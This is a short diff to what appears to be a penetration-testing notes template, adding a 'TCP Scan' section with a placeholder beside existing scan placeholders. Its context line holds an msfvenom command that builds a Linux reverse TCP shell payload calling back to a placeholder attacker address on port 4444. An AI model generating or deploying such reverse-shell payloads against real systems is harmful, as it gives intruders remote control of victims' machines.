@@ -12,6 +12,10 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f elf -o s
 
 INSERTTCPSCAN
 
+### TCP Scan
+
+INSERTFULLTCPSCAN
+
 ### Vuln Scan
 
 INSERTVULNSCAN
